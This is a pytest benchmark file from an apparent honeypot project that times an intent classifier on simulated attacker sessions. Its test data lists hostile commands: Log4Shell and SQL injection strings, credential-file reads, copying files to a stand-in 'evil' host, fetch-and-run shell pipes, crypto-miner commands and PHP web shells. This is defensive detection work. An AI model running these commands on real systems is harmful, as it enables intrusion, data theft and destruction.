"""Per-call latency benchmarks for the heuristic intent classifier.

The classifier runs on the hot path for every adaptive AI turn. We
benchmark a representative :class:`SessionMemory` for each canonical
:class:`IntentLabel` so regressions in any signal path are visible.
"""

from __future__ import annotations

import pytest

from honeytrap.ai.intent import IntentLabel, classify
from honeytrap.ai.memory import AuthAttempt, SessionMemory

pytestmark = pytest.mark.benchmark


_RECON_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "ls -la /etc",
    "cat /etc/passwd",
]
_BRUTE_FORCE_AUTHS = [AuthAttempt("root", f"pw{i}", success=False, timestamp=0.0) for i in range(8)]
_EXPLOIT_COMMANDS = [
    "GET /?x=${jndi:ldap://evil/a}",
    "GET /index.php?id=1 UNION SELECT 1,2,3",
    "../../../../etc/passwd",
    "<script>alert(1)</script>",
    "; rm -rf /",
]
_CRED_COMMANDS = [
    "cat ~/.ssh/id_rsa",
    "cat /root/.ssh/authorized_keys",
    "cat .bash_history",
    "cat ~/.aws/credentials",
    "cat /proc/self/environ",
]
_LATERAL_COMMANDS = [
    "psexec.py",
    "wmic /node:host process call create",
    "smbclient //srv/share",
    "winrm get config",
    "net use \\\\srv\\ipc$ /user:admin",
]
_EXFIL_COMMANDS = [
    "curl http://169.254.169.254/latest/meta-data/",
    "scp /etc/passwd evil:/tmp/p",
    "rsync -av /home/ evil:/loot/",
    "tar czf - /etc | base64 -w0",
    "ftp -n evil",
]
_PERSIST_COMMANDS = [
    "wget http://evil/x.sh | sh",
    "curl http://evil/y | bash",
    "chmod +x /tmp/m",
    "echo X | base64 -d",
    "crontab -e",
]
_MINER_COMMANDS = [
    "./xmrig --donate-level=1",
    "stratum+tcp://pool.minexmr.com:4444",
    "monero-miner --threads 4",
    "cpuminer -o stratum+tcp://x",
    "minerd -t 4",
]
_WEBSHELL_COMMANDS = [
    "<?php system($_GET['c']); ?>",
    "<?php eval($_POST['x']); ?>",
    "base64_decode($_REQUEST['z'])",
    "preg_replace('/.*/e', $_GET['y'], '')",
    "c99shell access",
]
_UNKNOWN_COMMANDS = ["hello", "world", "test", "ping", "?"]


def _memory(commands: list[str], auths: list[AuthAttempt] | None = None) -> SessionMemory:
    """Build a :class:`SessionMemory` populated with ``commands`` and ``auths``."""
    return SessionMemory(
        session_id="bench",
        source_ip="192.0.2.1",
        command_history=commands,
        auth_attempts=list(auths or []),
    )


def test_bench_intent_classify_recon(benchmark) -> None:
    """RECON signal path: many enumeration command tokens."""
    mem = _memory(_RECON_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.RECON


def test_bench_intent_classify_brute_force(benchmark) -> None:
    """BRUTE_FORCE signal path: stacked failed auth attempts."""
    mem = _memory([], _BRUTE_FORCE_AUTHS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.BRUTE_FORCE


def test_bench_intent_classify_exploit(benchmark) -> None:
    """EXPLOIT_ATTEMPT signal path: payload patterns."""
    mem = _memory(_EXPLOIT_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.EXPLOIT_ATTEMPT


def test_bench_intent_classify_credential_harvest(benchmark) -> None:
    """CREDENTIAL_HARVEST signal path: file-grab patterns."""
    mem = _memory(_CRED_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.CREDENTIAL_HARVEST


def test_bench_intent_classify_lateral_movement(benchmark) -> None:
    """LATERAL_MOVEMENT signal path: SMB / WinRM / psexec tokens."""
    mem = _memory(_LATERAL_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.LATERAL_MOVEMENT


def test_bench_intent_classify_exfiltration(benchmark) -> None:
    """EXFILTRATION signal path: cloud metadata + scp patterns."""
    mem = _memory(_EXFIL_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.EXFILTRATION


def test_bench_intent_classify_persistence(benchmark) -> None:
    """PERSISTENCE signal path: drop-and-execute patterns."""
    mem = _memory(_PERSIST_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.PERSISTENCE


def test_bench_intent_classify_coin_mining(benchmark) -> None:
    """COIN_MINING signal path: xmrig / stratum patterns."""
    mem = _memory(_MINER_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.COIN_MINING


def test_bench_intent_classify_web_shell(benchmark) -> None:
    """WEB_SHELL signal path: PHP / eval webshell artefacts."""
    mem = _memory(_WEBSHELL_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.WEB_SHELL


def test_bench_intent_classify_unknown(benchmark) -> None:
    """UNKNOWN signal path: no matching tokens."""
    mem = _memory(_UNKNOWN_COMMANDS)
    label, _, _ = benchmark(classify, mem)
    assert label == IntentLabel.UNKNOWN
